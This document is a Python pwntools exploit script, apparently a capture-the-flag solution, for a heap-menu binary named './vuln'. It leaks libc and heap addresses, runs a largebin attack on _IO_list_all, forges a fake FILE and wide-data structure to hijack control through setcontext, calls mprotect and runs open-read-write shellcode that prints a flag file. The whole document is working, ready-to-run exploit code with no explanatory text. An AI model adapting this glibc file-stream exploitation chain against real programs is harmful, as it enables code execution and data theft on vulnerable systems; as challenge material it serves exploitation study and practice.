from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './vuln'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE and args.DEBUG:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sla(b'>', str(idx).encode())

def create(i, sz):
    opt(1)
    sla(b'Index: ', str(i).encode())
    sla(b'Size: ', str(sz).encode())

def edit(i, content):
    opt(3)
    sla(b'Index: ', str(i).encode())
    sa(b'Content: ', content)

def show(i):
    opt(4)
    sla(b'Index: ', str(i).encode())

def delete(i):
    opt(2)
    sla(b'Index: ', str(i).encode())

def orw(addr):
    sh = shellcraft
    payload = sh.open('flag')
    payload += sh.read(3, addr, 0x100)
    payload += sh.write(1, addr, 0x100)
    payload += sh.exit(233)
    return asm(payload)

def exp():
    create(0, 0x500)
    create(1, 0x500)
    create(2, 0x518)
    create(3, 0x500)

    delete(2)
    create(4, 0x800)
    show(2)
    fd = u64(ru(b'\n1.', drop=True).ljust(8, b'\0'))
    log.success(f'fd={hex(fd)}')

    create(2, 0x518)
    edit(2, b'a'*0x10)
    show(2)
    ru(b'a'*0x10)
    fd_nxtsz = u64(r(6).ljust(8, b'\0'))
    log.success(f'fd_nextsize={hex(fd_nxtsz)}')

    delete(2)
    create(4, 0x800)

    # now chunk2 in largebin
    main_arena =  0x1ebb80 if args.REMOTE else 0x1d2c60
    libc.address = fd - 0x490 - main_arena
    log.success(f'libc={hex(libc.address)}')
    log.success(f'_IO_list_all at {hex(libc.sym._IO_list_all)}')
    edit(2, flat([fd, fd, fd_nxtsz, libc.sym._IO_list_all-0x20]))

    delete(0)
    create(4, 0x800)

    _IO_wfile_jumps = libc.sym._IO_wfile_jumps
    setcontext = libc.sym.setcontext + (0x3d if args.REMOTE else 0x35)
    mprotect = libc.sym.mprotect
    ret = libc.address + (0x25679 if args.REMOTE else 0x270c2)

    addr_chk0 = fd_nxtsz - 0xa20
    heap_base = addr_chk0 - 0x290
    _wide_data = addr_chk0 + 8
    _wide_vtable = _wide_data + 0xe8 - 0x18 # 0x18 is the offset to __overflow
    addr_rop = addr_chk0 + 0x200
    addr_ucontext = addr_chk0 + 0x100
    # mode > 0
    # fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
    # fp->_vtable_offset = 0
    fake_FILE = flat([
        # _flags, and _IO_read_ptr are chunk.prev_size and chunk.size
        0, 0, # _IO_read_ptr, _IO_read_end, _IO_read_base
        0, # _IO_write_base
        addr_ucontext, # RDX = _IO_write_ptr,
        2, # _ _IO_write_end
        [0] * 6, 
        0, # +0x68, _chain
        [0] * 6, 
        _wide_data, # +0xa0: _wide_data = fake_FILE+8
        [0] * 3, 
        1, # +0xc0: _mode
        [0] * 2, 
        _IO_wfile_jumps + 0x30, # +0xd8: RAX = _vtable
        # fake_FILE end, but fake_IO_wide_data still have some members.
        0,
        _wide_vtable,   # +0xe8 == fake_wide_data + 0xe0, _wide_vtable
        setcontext,     # +0xf0 == fake_wide_data + 0xe8, _wide_vtable->__overflow
    ])

    ucontext = flat({
        0x28: 0,          # +0x28: r8
        0x30: 0,          # +0x30: r9
        0x48: 0,          # +0x48: r12
        0x50: 0,          # +0x50: r13
        0x58: 0,          # +0x58: r14
        0x60: 0,          # +0x60: r15
        0x68: heap_base,  # +0x68: rdi
        0x70: 0x21000,    # +0x70: rsi
        0x78: 0,          # +0x78: rbp
        0x80: 0,          # +0x80: rbx
        0x88: 7,          # +0x88: rdx
        0x98: 0,          # +0x98: rcx
        0xa0: addr_rop,   # +0xa0: rsp 
        0xa8: mprotect    # +0xa8: rip
    })
    assert(len(ucontext) == 0xb0)

    payload = fake_FILE.ljust(0x100-0x10, b'\0') + ucontext
    addr_sh = addr_chk0 + 0x210
    payload = payload.ljust(0x200-0x10, b'\0') + p64(ret) + p64(addr_sh) + orw(addr_chk0+0x300)

    edit(0, payload)
    bpt()
    opt(5)

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()